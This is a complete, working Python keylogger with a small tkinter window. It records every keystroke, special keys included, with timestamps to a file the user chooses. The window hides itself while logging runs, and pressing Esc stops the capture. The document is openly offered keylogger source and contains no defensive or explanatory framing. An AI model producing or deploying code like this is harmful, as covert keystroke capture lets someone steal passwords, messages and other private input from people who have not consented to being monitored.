from pynput import keyboard
import tkinter as tk
import datetime

keylogger_listener = None  # Global variable to store the keylogger listener instance

def on_press(key):
    try:
        key_char = key.char
        with open(output_file, 'a') as file:
            file.write(f"{datetime.datetime.now()} - {key_char}\n")
    except AttributeError:
        # Special key encountered, add it to the log file
        key_name = str(key).replace("Key.", "<") + ">"
        with open(output_file, 'a') as file:
            file.write(f"{datetime.datetime.now()} - {key_name}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on pressing the 'esc' key
        return False

def start_keylogger():
    global keylogger_listener, output_file
    # Start the keylogger
    output_file = log_file_entry.get()
    keylogger_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    keylogger_listener.start()
    window.withdraw()  # Hide the GUI when the keylogger is running

def stop_keylogger():
    global keylogger_listener
    # Stop the keylogger
    if keylogger_listener:
        keylogger_listener.stop()
        window.deiconify()  # Show the GUI when the keylogger is stopped

# Create a simple GUI
window = tk.Tk()
window.title("Keylogger")
window.geometry("300x150")

log_file_label = tk.Label(window, text="Enter Log File Path:")
log_file_label.pack(pady=5)

log_file_entry = tk.Entry(window, width=30)
log_file_entry.pack(pady=5)

start_button = tk.Button(window, text="Start Keylogger", command=start_keylogger)
start_button.pack(pady=10)

stop_button = tk.Button(window, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(pady=10)

window.mainloop()
